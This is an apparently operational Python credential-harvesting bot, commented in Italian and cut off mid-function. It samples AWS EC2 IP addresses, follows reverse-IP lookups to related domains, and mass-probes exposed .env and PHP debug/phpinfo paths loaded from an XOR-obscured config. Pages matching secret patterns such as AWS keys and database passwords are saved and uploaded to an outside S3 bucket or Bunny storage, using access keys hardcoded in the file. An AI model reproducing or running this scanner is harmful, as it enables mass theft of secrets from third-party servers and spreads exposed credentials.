import os
import sys
import re
import json
import hashlib
import hmac
import string
import random
import ipaddress
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread

from gevent import monkey
monkey.patch_all(thread=False)
from gevent.pool import Pool

from urllib.parse import urlparse
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import warnings
import requests
import grequests
from itertools import islice

requests.packages.urllib3.disable_warnings()
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

class TeeLogger:
    def __init__(self, filepath):
        self.terminal = sys.stdout
        self.logfile = open(filepath, 'a', encoding='utf-8')
        self.at_newline = True

    def _ts(self):
        return time.strftime('%H:%M:%S', time.localtime())

    def write(self, message):
        if message and self.at_newline and not message.startswith('\r'):
            ts = f"[{self._ts()}] "
            self.terminal.write(ts)
            self.logfile.write(ts)
        self.terminal.write(message)
        self.logfile.write(message)
        self.at_newline = message.endswith('\n')

    def flush(self):
        self.terminal.flush()
        self.logfile.flush()

    def close(self):
        self.logfile.close()

# ============================================================
# CONFIG — Modifica qui per cambiare il comportamento del bot
# ============================================================

# --- Logging ---
LOG_ACTIVE = False
LOG_UPLOAD_INTERVAL = random.randint(500, 800)

# --- Storage ---
AWS_S3 = True
BUNNY_STORAGE = False

# --- S3 Config ---
S3_BUCKET = "diablo-results-store"
S3_FOLDER = "diablo-results"
S3_REGION = "eu-north-1"
S3_ACCESS_KEY = "AKIAW3MEAPS545FBGS5I"
S3_SECRET_KEY = "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"
S3_HOST = f"s3.{S3_REGION}.amazonaws.com"

# --- Bunny Config ---
BUNNY_STORAGE_URL = "https://storage.bunnycdn.com/datalg"
BUNNY_API_KEY = "20e09264-6a0b-4c15-9500eb86adfd-cfc3-482e"

# --- Fonti target ---
LOAD_FROM_SITE = False
LOAD_FROM_CIDR = True

# --- Reverse IP lookup dopo match trovato ---
USE_REV = True

# --- Performance ---
MAX_SITE_BATCH = 5
MAX_LIST_ENV = 30
MAX_LIST_PHP = 20
DNS_WORKERS_EC2 = 10
DNS_TIMEOUT_EC2 = 3
MAX_IPS_PER_CIDR = 2
TOTAL_SLOTS = 2000
NUM_WORKERS = 1

# ============================================================
# FINE CONFIG
# ============================================================

LOGS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
LOG_FILE = None
LOG_PATH = None

_CONTAINER_NAME = os.environ.get('HOSTNAME', f'local_{int(time.time())}')
_SLOT_HASH = int(hashlib.md5(_CONTAINER_NAME.encode()).hexdigest()[:12], 16)
INSTANCE_ID = _SLOT_HASH % TOTAL_SLOTS

# Paths assoluti (usati da upload e da _scan_site)
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
result_dir = os.path.join(_SCRIPT_DIR, 'output')
newpathtextract = os.path.join(result_dir, 'DATA_SPLIT')
SITE_DIR = os.path.join(_SCRIPT_DIR, 'site')

# ============================================================
# S3 FUNCTIONS
# ============================================================

def _aws_sign(key, msg):
    return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()

def _aws_sigv4_headers(bucket, key, payload_bytes):
    """Genera gli header Authorization per AWS Signature V4 (PUT object su S3)."""
    amz_date = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    date_stamp = amz_date[:8]
    service = "s3"
    algorithm = "AWS4-HMAC-SHA256"

    canonical_uri = f"/{key}"
    payload_hash = hashlib.sha256(payload_bytes).hexdigest()

    canonical_headers = (
        f"host:{bucket}.{S3_HOST}\n"
        f"x-amz-content-sha256:{payload_hash}\n"
        f"x-amz-date:{amz_date}\n"
    )
    signed_headers = "host;x-amz-content-sha256;x-amz-date"

    canonical_request = (
        f"PUT\n{canonical_uri}\n\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
    )

    credential_scope = f"{date_stamp}/{S3_REGION}/{service}/aws4_request"
    string_to_sign = (
        f"{algorithm}\n{amz_date}\n{credential_scope}\n"
        f"{hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()}"
    )

    k_date = _aws_sign(("AWS4" + S3_SECRET_KEY).encode("utf-8"), date_stamp)
    k_region = _aws_sign(k_date, S3_REGION)
    k_service = _aws_sign(k_region, service)
    k_signing = _aws_sign(k_service, "aws4_request")
    signature = hmac.new(k_signing, string_to_sign.encode("utf-8"), hashlib.sha256).hexdigest()

    auth = (
        f"{algorithm} Credential={S3_ACCESS_KEY}/{credential_scope}, "
        f"SignedHeaders={signed_headers}, Signature={signature}"
    )

    return {
        "Host": f"{bucket}.{S3_HOST}",
        "x-amz-date": amz_date,
        "x-amz-content-sha256": payload_hash,
        "Authorization": auth,
        "Content-Type": "application/octet-stream",
    }

def _append_to_s3_index(s3_key_full):
    """Registra il file nell'index.txt su S3 con retry e locking ottimistico (ETag)."""
    index_key = f"{S3_FOLDER}/index.txt"
    url_idx = f"https://{S3_BUCKET}.{S3_HOST}/{index_key}"

    for attempt in range(5):
        try:
            time.sleep(random.uniform(0.5, 3.0))

            amz_date = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
            date_stamp = amz_date[:8]

            canonical_headers_get = (
                f"host:{S3_BUCKET}.{S3_HOST}\n"
                f"x-amz-content-sha256:UNSIGNED-PAYLOAD\n"
                f"x-amz-date:{amz_date}\n"
            )
            signed_headers_get = "host;x-amz-content-sha256;x-amz-date"
            canonical_request_get = (
                f"GET\n/{index_key}\n\n{canonical_headers_get}\n{signed_headers_get}\nUNSIGNED-PAYLOAD"
            )
            credential_scope = f"{date_stamp}/{S3_REGION}/s3/aws4_request"
            string_to_sign_get = (
                f"AWS4-HMAC-SHA256\n{amz_date}\n{credential_scope}\n"
                f"{hashlib.sha256(canonical_request_get.encode('utf-8')).hexdigest()}"
            )
            k_date = _aws_sign(("AWS4" + S3_SECRET_KEY).encode("utf-8"), date_stamp)
            k_region = _aws_sign(k_date, S3_REGION)
            k_service = _aws_sign(k_region, "s3")
            k_signing = _aws_sign(k_service, "aws4_request")
            sig_get = hmac.new(k_signing, string_to_sign_get.encode("utf-8"), hashlib.sha256).hexdigest()

            get_headers = {
                "Host": f"{S3_BUCKET}.{S3_HOST}",
                "x-amz-date": amz_date,
                "x-amz-content-sha256": "UNSIGNED-PAYLOAD",
                "Authorization": f"AWS4-HMAC-SHA256 Credential={S3_ACCESS_KEY}/{credential_scope}, "
                                 f"SignedHeaders={signed_headers_get}, Signature={sig_get}",
            }

            res_get = requests.get(url_idx, headers=get_headers, timeout=10)
            existing = ""
            current_etag = None

            if res_get.status_code == 200:
                existing = res_get.text or ""
                current_etag = res_get.headers.get("ETag", "").strip('"')

            new_content = existing + s3_key_full + "\n"
            idx_payload = new_content.encode("utf-8")

            put_headers = _aws_sigv4_headers(S3_BUCKET, index_key, idx_payload)
            put_headers["Content-Type"] = "text/plain"
            if current_etag:
                put_headers["If-Match"] = f'"{current_etag}"'

            res_put = requests.put(url_idx, headers=put_headers, data=idx_payload, timeout=10)

            if res_put.status_code in [200, 201]:
                return
            elif res_put.status_code == 412:
                time.sleep(0.5 * (2 ** attempt))
                continue
            else:
                time.sleep(1)
                continue
        except Exception:
            time.sleep(1)
            continue

def upload_file_to_s3(local_path, remote_path, max_retries=3):
    """Carica un file su S3 nella cartella dedicata — via HTTP PUT + AWS SigV4."""
    if not AWS_S3:
        return False
    s3_key = f"{S3_FOLDER}/{remote_path}"
    last_error = None
    for attempt in range(max_retries):
        try:
            print(f"[S3 UPLOAD] Invio {local_path} -> s3://{S3_BUCKET}/{s3_key} (tent {attempt+1}/{max_retries})...", flush=True)
            with open(local_path, "rb") as f:
                payload = f.read()

            headers = _aws_sigv4_headers(S3_BUCKET, s3_key, payload)
            url = f"https://{S3_BUCKET}.{S3_HOST}/{s3_key}"
            res = requests.put(url, headers=headers, data=payload, timeout=30)

            if res.status_code in [200, 201]:
                print(f"[S3 UPLOAD] OK: s3://{S3_BUCKET}/{s3_key}", flush=True)
                _append_to_s3_index(s3_key)
                return True
            elif res.status_code == 429:
                wait = 2 ** attempt
                print(f"[S3 UPLOAD] Rate limited (429), retry tra {wait}s...", flush=True)
                time.sleep(wait)
                last_error = "429 Rate Limited"
            elif res.status_code >= 500:
                wait = 2 ** attempt
                print(f"[S3 UPLOAD] Server error {res.status_code}, retry tra {wait}s...", flush=True)
                time.sleep(wait)
                last_error = f"Status {res.status_code}"
            else:
                print(f"[S3 UPLOAD] Errore {s3_key}: Status {res.status_code}", flush=True)
                return False
        except Exception as e:
            last_error = str(e)
            if attempt < max_retries - 1:
                wait = 2 ** attempt
                print(f"[S3 UPLOAD] Eccezione {s3_key}: {e}, retry tra {wait}s...", flush=True)
                time.sleep(wait)
            else:
                print(f"[S3 UPLOAD] Upload FALLITO {s3_key}: {e}", flush=True)
    if last_error:
        try:
            with open(os.path.join(result_dir, 'err.log'), 'a', encoding='utf-8') as f:
                f.write(f"Error uploading to S3 ({s3_key}): {last_error}\n")
        except:
            pass
    return False

def upload_log_to_s3():
    if not LOG_ACTIVE:
        return
    if not LOG_PATH or not os.path.exists(LOG_PATH):
        return
    remote = f"logs/{os.path.basename(LOG_PATH)}"
    upload_file_to_s3(LOG_PATH, remote, max_retries=1)

# ============================================================
# BUNNY FUNCTIONS
# ============================================================

def upload_file_to_bunny(local_path, remote_path, max_retries=3):
    """Carica un file su Bunny Storage via HTTP PUT."""
    if not BUNNY_STORAGE:
        return False
    headers = {"AccessKey": BUNNY_API_KEY}
    url = f"{BUNNY_STORAGE_URL}/{remote_path}"
    last_error = None
    for attempt in range(max_retries):
        try:
            print(f"[BUNNY UPLOAD] Invio {local_path} -> {remote_path} (tent {attempt+1}/{max_retries})...", flush=True)
            with open(local_path, "rb") as f:
                res = requests.put(url, headers=headers, data=f, timeout=30)
            if res.status_code in [200, 201]:
                print(f"[BUNNY UPLOAD] OK: {remote_path}", flush=True)
                return True
            elif res.status_code == 429:
                wait = 2 ** attempt
                print(f"[BUNNY UPLOAD] Rate limited (429), retry tra {wait}s...", flush=True)
                time.sleep(wait)
                last_error = "429 Rate Limited"
            elif res.status_code >= 500:
                wait = 2 ** attempt
                print(f"[BUNNY UPLOAD] Server error {res.status_code}, retry tra {wait}s...", flush=True)
                time.sleep(wait)
                last_error = f"Status {res.status_code}"
            else:
                print(f"[BUNNY UPLOAD] Errore {remote_path}: Status {res.status_code}", flush=True)
                return False
        except Exception as e:
            last_error = str(e)
            if attempt < max_retries - 1:
                wait = 2 ** attempt
                print(f"[BUNNY UPLOAD] Eccezione {remote_path}: {e}, retry tra {wait}s...", flush=True)
                time.sleep(wait)
            else:
                print(f"[BUNNY UPLOAD] Upload FALLITO {remote_path}: {e}", flush=True)
    if last_error:
        try:
            with open(os.path.join(result_dir, 'err.log'), 'a', encoding='utf-8') as f:
                f.write(f"Error uploading to Bunny ({remote_path}): {last_error}\n")
        except:
            pass
    return False

def upload_log_to_bunny():
    if not LOG_ACTIVE:
        return
    if not LOG_PATH or not os.path.exists(LOG_PATH):
        return
    remote = f"logs/{os.path.basename(LOG_PATH)}"
    upload_file_to_bunny(LOG_PATH, remote, max_retries=1)

# ============================================================
# UPLOAD DISPATCH (unico punto di upload)
# ============================================================

def _upload_file(local_path, remote_path, max_retries=3):
    """Carica il file su S3 e/o Bunny in base alla config."""
    ok = False
    if AWS_S3:
        if upload_file_to_s3(local_path, remote_path, max_retries):
            ok = True
    if BUNNY_STORAGE:
        if upload_file_to_bunny(local_path, remote_path, max_retries):
            ok = True
    return ok

def _upload_log():
    """Carica il log su S3 e/o Bunny."""
    if not LOG_ACTIVE:
        return
    if not LOG_PATH or not os.path.exists(LOG_PATH):
        return
    remote = f"logs/{os.path.basename(LOG_PATH)}"
    _upload_file(LOG_PATH, remote, max_retries=1)

# ============================================================
# CONFIG FILE + FIRME
# ============================================================

def load_config():
    """Legge config da file cifrato (pack.dat)."""
    config_path = os.path.join(_SCRIPT_DIR, 'pack.dat')
    try:
        with open(config_path, 'rb') as f:
            data = f.read()
        key = b'xK9#mP2$vL7@nQ5'
        decrypted = bytearray()
        for i, b in enumerate(data):
            decrypted.append(b ^ key[i % len(key)])
        return json.loads(decrypted.decode('utf-8'))
    except:
        return {}

config = load_config()
patterns = config.get('APP_REGEX_ENV_SHELL', [])
file_envscan = list(dict.fromkeys(config.get('file_env_shellscan', [])))
file_phpprofile = list(dict.fromkeys(config.get('file_phpprofile_shellscan', [])))

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive"
}

def generate_list_env_from_json_multi(site_link):
    base = site_link.rstrip('/')
    for i in range(0, len(file_envscan), MAX_LIST_ENV):
        yield [f"{base}/{p.lstrip('/')}" for p in file_envscan[i:i + MAX_LIST_ENV]]

def generate_list_phpprofile_from_json_multi(site_link):
    base = site_link.rstrip('/')
    for i in range(0, len(file_phpprofile), MAX_LIST_PHP):
        yield [f"{base}/{p.lstrip('/')}" for p in file_phpprofile[i:i + MAX_LIST_PHP]]

def read_body(req):
    if sys.version_info[0] < 3:
        try:
            try: return str(req.content)
            except:
                try: return str(req.content.encode('utf-8'))
                except: return str(req.content.decode('utf-8'))
        except: return str(req.text)
    else:
        try:
            return str(req.content.decode('utf-8', errors='ignore'))
        except Exception:
            try:
                return str(req.text)
            except Exception:
                return str(req.content)

def get_initial_url(url):
    if url.startswith('http://') or url.startswith('https://'):
        return url
    if url.endswith(':443'):
        return f"https://{url}"
    if url.endswith(':80'):
        return f"http://{url}"
    return f"http://{url}"

def get_retry_url(url):
    if url.startswith('http://'):
        return url.replace('http://', 'https://', 1)
    if url.startswith('https://'):
        return url.replace('https://', 'http://', 1)
    if url.endswith(':443') or url.endswith(':80'):
        return None
    return f"https://{url}"

def reverse_ip_lookup(ip):
    url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            result = response.text.strip()
            if "No DNS A records found" in result or "API count exceeded" in result or "error" in result.lower():
                return None
            else:
                aweee = []
                domains = result.split('\n')
                for d in domains:
                    if d.startswith("www."):
                        d = d[4:]
                    aweee.append(d)
                return aweee
    except:
        pass
    return None

# ============================================================
# LOAD FROM SITE FOLDER
# ============================================================

def load_sites_from_folder():
    """Legge UN file .txt alla volta dalla cartella site/.
       Restituisce (targets, filepath) del primo file trovato, o ([], None) se nessuno.
       Il chiamante DEVE cancellare il file DOPO aver processato i target."""
    if not LOAD_FROM_SITE:
        return [], None

    if not os.path.isdir(SITE_DIR):
        print(f"[SITE] Cartella '{SITE_DIR}' non trovata. Creala e mettici i file .txt con i target.", flush=True)
        return [], None

    files = sorted([f for f in os.listdir(SITE_DIR) if f.endswith('.txt')])

    if not files:
        return [], None

    # Prende solo il primo file
    filename = files[0]
    filepath = os.path.join(SITE_DIR, filename)
    targets = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if not line.startswith('http'):
                        line = get_initial_url(line)
                    targets.append(line)
    except Exception as e:
        print(f"[SITE] Errore lettura {filename}: {e}", flush=True)
        return [], filepath

    print(f"[SITE] {filename}: {len(targets)} target caricati", flush=True)
    return targets, filepath


def delete_site_file(filepath):
    """Cancella un file .txt dopo che i suoi target sono stati processati."""
    try:
        os.remove(filepath)
        print(f"[SITE] {os.path.basename(filepath)} CANCELLATO", flush=True)
    except Exception as e:
        print(f"[SITE] (!) Impossibile cancellare {os.path.basename(filepath)}: {e}", flush=True)

# ============================================================
# SCANSIONE
# ============================================================

def process_urls(urls_list, is_fallback=False):
    it = iter(urls_list)
    print(f"\n[CHK] Avvio scansione su {len(urls_list)} URL (fallback={is_fallback})...", flush=True)
    while True:
        chunk = list(islice(it, 100))
        if not chunk:
            break

        print(f"[CHK] Controllo blocco di {len(chunk)} URL...", flush=True)
        try:
            resp_site = [
                grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False)
                for url in chunk
            ]
            merdb = grequests.map(resp_site)
            hosts_by_site = {}
            for r in merdb:
                if r is not None and r.status_code in [requests.codes.ok, 403, 206]:
                    site_url = r.url
                    if site_url not in hosts_by_site:
                        hosts_by_site[site_url] = {
                            'env': list(generate_list_env_from_json_multi(site_url)),
                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
                        }
                if r: r.close()

            retry_urls = []
            for i, r in enumerate(merdb):
                if r is None or (r.status_code not in [requests.codes.ok, 403, 206]):
                    retry_u = get_retry_url(chunk[i])
                    if retry_u:
                        retry_urls.append(retry_u)

            if retry_urls:
                print(f"[CHK] Retry su {len(retry_urls)} URL in HTTPS...", flush=True)
                resp_retry = [
                    grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False)
                    for url in retry_urls
                ]
                retry_responses = grequests.map(resp_retry)
                for r in retry_responses:
                    if r is not None and r.status_code in [requests.codes.ok, 403, 206]:
                        site_url = r.url
                        if site_url not in hosts_by_site:
                            hosts_by_site[site_url] = {
                                'env': list(generate_list_env_from_json_multi(site_url)),
                                'php': list(generate_list_phpprofile_from_json_multi(site_url))
                            }
                    if r: r.close()

            # Scansiona in batch da MAX_SITE_BATCH (max siti concorrenti)
            site_list = list(hosts_by_site.items())
            for batch_idx in range(0, len(site_list), MAX_SITE_BATCH):
                chunk_sites = site_list[batch_idx:batch_idx + MAX_SITE_BATCH]
                site_pool = Pool(len(chunk_sites))
                jobs = []
                for site_link, site_payloads in chunk_sites:
                    jobs.append(site_pool.spawn(_scan_site, site_link, site_payloads, is_fallback))
                site_pool.join()
                bn = batch_idx // MAX_SITE_BATCH + 1
                total_batches = (len(site_list) + MAX_SITE_BATCH - 1) // MAX_SITE_BATCH
                print(f"  [CHK] Batch {bn}/{total_batches} completato", flush=True)

            del hosts_by_site
            del jobs

        except Exception as e:
            try:
                with open(os.path.join(result_dir, 'err.log'), 'a', encoding='utf-8') as f:
                    f.write(str(e) + '\n')
            except:
                pass

def _scan_site(site_link, site_payloads, is_fallback=False):
    try:
        print(f"  [LOOK] Avvio analisi {site_link}", flush=True)

        checked = 0          # link ENV che hanno risposto 200
        checkeds = 0         # link PHP che hanno risposto 200
        wildcard_strike_count = 0
        fake_for_site = False
        found_for_site = False
        seen_content_hashes = set()
        headers_range = dict(headers)
        headers_range['Range'] = 'bytes=0-4096'

        # ============================================================
        # FASE 1: ENV SCOUTING (GET)
        # ============================================================
        env_batches = site_payloads.get('env', [])
        for batch in env_batches:
            if fake_for_site or found_for_site: break
            reqss = [grequests.get(url, stream=True, timeout=6, verify=False, allow_redirects=False, headers=headers_range) for url in batch]
            merdb = grequests.map(reqss)

            for r in merdb:
                if fake_for_site or found_for_site: break
                if r is not None and r.status_code in [200, 206]:
                    checked += 1
                    try:
                        content = read_body(r)
                        content_lower = content.lower()

                        # False positive check
                        if '<pre' in content_lower and '</pre>' in content_lower:
                            fake_for_site = True
                            print(f"  [!] Skip on {site_link} - NOPE", flush=True)
                            r.close()
                            break
                        if "popbox.fun" in content_lower:
                            fake_for_site = True
                            print(f"  [!] Skip on {site_link} - NOPE", flush=True)
                            r.close()
                            break

                        # Regex check
                        for pattern in patterns:
                            is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
                            if is_regex: regex_pattern = pattern
                            else:
                                escaped = re.escape(pattern)
                                start_b = r"\b" if pattern[0].isalnum() or pattern[0] == '_' else ""
                                end_b = r"\b" if pattern[-1].isalnum() or pattern[-1] == '_' else ""
                                regex_pattern = f"{start_b}{escaped}{end_b}"

                            if re.search(regex_pattern, content, re.IGNORECASE):
                                found_for_site = True
                                break

                        if found_for_site:
                            print(f"  [+] Found | {r.url}", flush=True)
                            rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                            saved_file_path = os.path.join(newpathtextract, f'ENV_NEW_{rnd_suffix}.txt')
                            with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{r.url}\n{content}\n')
                            remote_subpath = f"risultati/DATA_SPLIT/ENV_NEW_{rnd_suffix}.txt"
                            _upload_file(saved_file_path, remote_subpath)
                    except:
                        pass
                if r:
                    try: r.close()
                    except: pass

            # Catch-all ENV: >=10 file .env rispondono 200 -> sito flood
            if checked >= 10 and not found_for_site:
                fake_for_site = True
                print(f"  [!] DUPE ENV ({checked}+ link) su {site_link} - NOPE", flush=True)
                break

        if fake_for_site:
            print(f"  [OK] STOP NOPE {site_link} — testati {checked} link (DUPE/flood)", flush=True)
            return

        if found_for_site:
            print(f"  [OK] STOP FOUND Mtch {site_link} — testati {checked} link", flush=True)
            # Reverse / fallback
            if USE_REV and not is_fallback:
                hostxxx = urlparse(site_link).hostname
                if hostxxx:
                    if hostxxx.startswith("www."):
                        hostxxx = hostxxx[4:]
                    try:
                        target_ip = socket.gethostbyname(hostxxx)
                        reversed_domains = reverse_ip_lookup(target_ip)
                        if reversed_domains:
                            hostxxx_clean = hostxxx.lower().rstrip('/')
                            reversed_domains = [d for d in reversed_domains if d.lower().rstrip('/') != hostxxx_clean]
                            if reversed_domains:
                                print(f"  [REV] IP {target_ip} — trovati {len(reversed_domains)} domini da processare", flush=True)
                                for d in reversed_domains:
                                    print(f"    [REV] => {d}", flush=True)
                                process_urls(reversed_domains, is_fallback=True)
                    except:
                        pass
            return

        # ============================================================
        # FASE 2: PHP SCOUTING (POST) — solo se ENV non ha trovato
        # ============================================================
        php_batches = site_payloads.get('php', [])
        findfile_requests = []
        for batch in php_batches:
            if fake_for_site or found_for_site: break
            reqss = [grequests.post(url, data={"0x01[]":"x"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_range) for url in batch]
            merdb = grequests.map(reqss)
            unique_responses = {}

            for r in merdb:
                if fake_for_site or found_for_site: break
                if r is not None and r.status_code in [200, 206]:
                    checkeds += 1
                    if r.url not in unique_responses:
                        try:
                            content = r.content
                            content_len = len(content)
                        except:
                            r.close()
                            continue
                        if content_len < 10 or content_len > 1000000:
                            r.close()
                            continue
                        is_html_doc = b'<html' in content[:200].lower() or b'<!doctype' in content[:200].lower()
                        is_debug_page = False
                        if is_html_doc:
                            content_str_head = content[:5000].decode('utf-8', errors='ignore').lower()
                            debug_keywords = ['phpinfo()', 'php version', 'zend extension', 'php license', 'sf-toolbar', 'symfony profiler', 'php-debugbar', 'whoops! there was an error', 'stack trace', 'aws_access_key_id', 'db_password', 'db_host', 'aws_secret']
                            if any(k in content_str_head for k in debug_keywords):
                                is_debug_page = True

                        if is_html_doc and not is_debug_page:
                            r.close()
                            continue

                        content_hash = hashlib.md5(content).hexdigest()
                        if content_hash in seen_content_hashes:
                            wildcard_strike_count += 1
                            r.close()
                            if wildcard_strike_count >= 5:
                                fake_for_site = True
                                print(f"  [!] DUP (5 duplicati) su {site_link} - NOPE", flush=True)
                                break
                            continue
                        seen_content_hashes.add(content_hash)
                        unique_responses[r.url] = r
                        findfile_requests.append(r)
                    else:
                        r.close()
                else:
                    try: r.close()
                    except: pass

            # Catch-all PHP: >=10 file php rispondono 200 -> sito flood
            if checkeds >= 10 and not found_for_site:
                fake_for_site = True
                print(f"  [!] DUPE PHP ({checkeds}+ link) su {site_link} - NOPE", flush=True)
                break

            # Deep extraction sui target validi
            valid_responzzz = list(unique_responses.values())
            if valid_responzzz:
                print(f"  [DEEP] {len(valid_responzzz)} target validi, estrazione regex su {site_link}", flush=True)

                for r in findfile_requests:
                    if r is None: continue
                    try:
                        contentsx = read_body(r)
                    except:
                        continue

                    response_url = r.url
                    for pattern in patterns:
                        is_regex = any(c in pattern for c in r".^$*+?{}[]\|()")
                        if is_regex: regex_pattern = pattern
                        else:
                            escaped = re.escape(pattern)
                            start_b = r"\b" if pattern[0].isalnum() or pattern[0] == '_' else ""
                            end_b = r"\b" if pattern[-1].isalnum() or pattern[-1] == '_' else ""
                            regex_pattern = f"{start_b}{escaped}{end_b}"

                        if re.search(regex_pattern, contentsx, re.IGNORECASE):
                            found_for_site = True
                            break

                    if found_for_site:
                        print(f"  [+] Found | {response_url}", flush=True)

                        # Salva ENV_NEW
                        rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                        saved_file_path = os.path.join(newpathtextract, f'ENV_NEW_{rnd_suffix}.txt')
                        with open(saved_file_path, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{contentsx}\n')
                        remote_subpath = f"risultati/DATA_SPLIT/ENV_NEW_{rnd_suffix}.txt"
                        _upload_file(saved_file_path, remote_subpath)

                        # PHPINFO extraction
                        try:
                            soup = BeautifulSoup(contentsx, "html.parser")
                            h2_tag = soup.find("h2", string="PHP Variables")
                            if h2_tag:
                                table = h2_tag.find_next("table")
                                if table:
                                    rows = table.find_all("tr")
                                    formatted_output = ""
                                    for row in rows:
                                        cols = row.find_all("td")
                                        if len(cols) >= 2:
                                            var_name = cols[0].get_text(strip=True)
                                            var_value = cols[1].get_text(strip=True)
                                            match = re.search(r"\['([^']+)'\]", var_name)
                                            if match:
                                                clean_key = match.group(1)
                                                formatted_output += f"{clean_key} \t {var_value}\n"
                                    if formatted_output:
                                        print(f"  [+] PHPINFO FOUND | {response_url}", flush=True)
                                        rnd_suffix_php = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                                        saved_php = os.path.join(newpathtextract, f'PHPINFO_{rnd_suffix_php}.txt')
                                        with open(saved_php, 'a', encoding='utf-8') as f: f.write(f'{response_url}\n{formatted_output}\n')
                                        remote_php = f"risultati/DATA_SPLIT/PHPINFO_{rnd_suffix_php}.txt"
                                        _upload_file(saved_php, remote_php)
                        except:
                            pass

                    try: r.close()
                    except: pass

            if fake_for_site or found_for_site: break

        # ============================================================
        # RIEPILOGO FINALE
        # ============================================================
        total_tested = checked + checkeds
        if fake_for_site:
            print(f"  [OK] STOP NOPE {site_link} — testati {total_tested} link (DUPE)", flush=True)
        elif found_for_site:
            print(f"  [OK] STOP FOUND Mtch {site_link} — testati {total_tested} link", flush=True)
            # Reverse / fallback
            if USE_REV and not is_fallback:
                hostxxx = urlparse(site_link).hostname
                if hostxxx:
                    if hostxxx.startswith("www."):
                        hostxxx = hostxxx[4:]
                    try:
                        target_ip = socket.gethostbyname(hostxxx)
                        reversed_domains = reverse_ip_lookup(target_ip)
                        if reversed_domains:
                            hostxxx_clean = hostxxx.lower().rstrip('/')
                            reversed_domains = [d for d in reversed_domains if d.lower().rstrip('/') != hostxxx_clean]
                            if reversed_domains:
                                print(f"  [REV] IP {target_ip} — trovati {len(reversed_domains)} domini da processare", flush=True)
                                for d in reversed_domains:
                                    print(f"    [REV] => {d}", flush=True)
                                process_urls(reversed_domains, is_fallback=True)
                    except:
                        pass
        else:
            print(f"  [OK] STOP NONE {site_link} — testati {total_tested} link", flush=True)

    except Exception as e:
        try:
            with open(os.path.join(result_dir, 'err.log'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')
        except:
            pass

# ============================================================
# AWS CIDR
# ============================================================

def fetch_aws_ips():
    url = "https://ip-ranges.amazonaws.com/ip-ranges.json"
    print("[AWS FETCH] Scaricamento dati IP ranges da AWS...", flush=True)
    resp = requests.get(url, timeout=30)
    resp.raise_for_status()
    return resp.json()

def get_ec2_cidrs(data):
    cidrs = []
    for p in data["prefixes"]:
        if p["service"] == "EC2":
            cidrs.append((p["ip_prefix"], p["region"]))
    return cidrs

def build_cidr_pool(cidrs_with_regions):
    sources = []
    for cidr, region in cidrs_with_regions:
        try:
            net = ipaddress.ip_network(cidr, strict=False)
            total = net.num_addresses
            first = int(net.network_address)
            sources.append((first, total, region))
        except Exception:
            pass

    regions_set = set(r for _, _, r in sources)
    print(f"[AWS POOL] {len(sources)} CIDR in {len(regions_set)} regioni "
          f"(max {MAX_IPS_PER_CIDR:,} IP/CIDR, sample casuale ogni ciclo)", flush=True)
    return sources

def verify_ec2_webserver(ip, region):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        hostname = hostname.lower()
        if "compute.amazonaws.com" not in hostname:
            return None
        for port, proto in [(443, "https"), (80, "http")]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((hostname, port))
                s.close()
                return f"{proto}://{hostname}"
            except Exception:
                continue
        return None
    except Exception:
        return None

def gather_and_scan_cycle(cidr_pool, worker_id, num_workers, cycle_num):
    total_cidrs = len(cidr_pool)
    seen_urls = set()
    all_ips = []

    for first, total, region in cidr_pool:
        rem = (INSTANCE_ID - (first % TOTAL_SLOTS)) % TOTAL_SLOTS
        if rem >= total:
            continue

        offsets_pool = list(range(rem, total, TOTAL_SLOTS))
        rng = random.Random(first * 7919 + cycle_num * 104729)
        n_take = min(len(offsets_pool), MAX_IPS_PER_CIDR)
        if n_take >= len(offsets_pool):
            chosen = offsets_pool
        else:
            chosen = rng.sample(offsets_pool, n_take)

        for off in chosen:
            all_ips.append((str(ipaddress.ip_address(first + off)), region))

    random.shuffle(all_ips)

    my_ips = [(ip, region) for i, (ip, region) in enumerate(all_ips) if i % num_workers == worker_id]
    random.shuffle(my_ips)
    total_my = len(my_ips)

    total_container = len(all_ips)
    if worker_id == 0:
        print(f"[AWS GATHER #{cycle_num}] Shard {INSTANCE_ID}/{TOTAL_SLOTS}, "
              f"{total_container:,} IP esclusivi "
              f"({total_cidrs} CIDR x {MAX_IPS_PER_CIDR}), "
              f"divisi tra {num_workers} worker (~{total_container // num_workers:,} ciascuno). "
              f"DNS + TCP verify in corso ({DNS_WORKERS_EC2} thread)...", flush=True)

    chunk = []
    hits = 0
    processed = 0
    last_pct = -1

    for ip, region in my_ips:
        chunk.append((ip, region))

        if len(chunk) >= DNS_WORKERS_EC2:
            with ThreadPoolExecutor(max_workers=DNS_WORKERS_EC2) as executor:
